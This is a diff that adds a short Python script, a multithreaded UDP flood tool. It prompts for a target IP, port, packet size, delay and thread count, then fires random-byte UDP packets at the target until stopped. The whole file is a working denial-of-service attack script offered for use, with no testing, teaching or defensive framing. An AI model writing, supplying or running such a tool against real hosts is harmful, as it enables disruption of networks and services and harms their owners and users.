@@ -1,0 +1,41 @@
+import socket
+import random
+import threading
+import time
+
+packet_counter = 0
+stop_event = threading.Event()
+
+def udp_flood(ip, port, packet_size, delay):
+    global packet_counter
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    udp_bytes = random._urandom(packet_size)
+    while not stop_event.is_set():
+        sock.sendto(udp_bytes, (ip, port))
+        packet_counter += 1
+        time.sleep(delay)
+
+def main():
+    ip = input("Target IP: ")
+    port = int(input("Target Port: "))
+    packet_size = int(input("Packet Size (bytes): "))
+    delay = float(input("Delay between packets (seconds): "))
+    thread_count = int(input("Number of threads: "))
+
+    threads = []
+    for _ in range(thread_count):
+        t = threading.Thread(target=udp_flood, args=(ip, port, packet_size, delay))
+        t.start()
+        threads.append(t)
+
+    print("Flood started. Press Enter to stop.")
+    input()
+    stop_event.set()
+
+    for t in threads:
+        t.join()
+
+    print(f"Total packets sent: {packet_counter}")
+
+if __name__ == "__main__":
+    main()
